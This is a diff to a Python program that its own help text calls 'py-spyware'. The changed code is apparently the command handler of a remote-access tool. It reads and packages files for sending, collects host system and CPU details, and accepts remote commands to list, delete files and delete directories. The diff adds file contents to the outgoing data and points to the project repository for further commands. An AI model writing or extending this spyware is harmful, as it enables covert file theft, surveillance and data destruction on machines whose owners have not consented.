@@ -103,6 +103,7 @@ class App:
                 with open(filepath, "rb") as f:
                     content = f.read()
                     header = f"FILE:{os.path.basename(filepath)}:{len(content)}"
+                    data = content
             except Exception as e:
                 text = "error while sending file" + str(e)
                 
@@ -127,12 +128,6 @@ class App:
             text += "\n OS version : " + str(platform.version())
             text += "\n Architecture : " + str(platform.machine())
             text += "\n Processor : " + str(platform.processor())
-            
-            text += "\n Hostname : " + str(self.socket.gethostname())
-            try:
-                text += "\n Local IP : " + str(self.socket.gethostbyname(self.socket.gethostname()))
-            except:
-                text += "\n Local IP : N/A"
                 
             text += "\n CPU cores : " + str(psutil.cpu_count(logical=True))
             text += "\n CPU usage (%) : " + str(psutil.cpu_percent(interval=1))
@@ -177,6 +172,8 @@ class App:
             text += "\n ls >>>to get all the directories and files in the current path"
             text += "\n remove + name >>>delete the file"
             text += "\n removedir + name >>>delete the directory"
+            text += "\n for others commands see the readme at the github repository : "
+            text += "\n https://github.com/mathishp33/py-spyware"
             text += "\n exit >>>exit program"
             
         else:
